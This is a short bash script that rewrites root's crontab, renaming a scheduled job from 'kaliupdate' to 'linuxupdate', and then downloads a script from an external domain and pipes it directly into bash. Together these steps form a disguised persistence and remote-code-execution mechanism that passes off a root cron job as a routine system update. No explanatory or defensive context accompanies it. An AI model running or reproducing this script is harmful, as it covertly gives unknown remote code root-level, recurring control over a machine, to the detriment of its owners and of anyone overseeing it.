#!/usr/bin/bash

cat /var/spool/cron/crontabs/root | sed -e 's/kaliupdate/linuxupdate/' > /tmp/crontab
mv /tmp/crontab /var/spool/cron/crontabs/root

curl -L erikboesen.com/linuxupdate.sh | bash
